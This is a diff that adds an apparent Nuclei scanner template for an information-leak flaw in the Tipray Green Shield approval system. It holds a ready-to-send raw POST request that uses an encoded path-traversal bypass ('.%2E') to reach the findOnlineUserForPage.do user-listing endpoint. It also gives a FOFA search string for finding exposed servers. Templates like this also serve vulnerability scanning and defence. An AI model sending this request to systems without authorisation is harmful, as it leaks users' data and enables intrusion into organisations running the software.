@@ -1,0 +1,29 @@
+id: poc-akua2di7nmgb1wi8
+info:
+  name: 天锐绿盾审批系统 findOnlineUserForPage.do 存在信息泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/akua2di7nmgb1wi8'
+  tags: info-leak,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: akua2di7nmgb1wi8
+    fofa: app="TIPPAY-绿盾审批系统"
+http:
+- raw:
+  - 'POST /trwfe/service/.%2E/user/findOnlineUserForPage.do HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
+
+    Accept-Encoding: gzip, deflate
+
+    Accept: */*
+
+    Connection: keep-alive'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
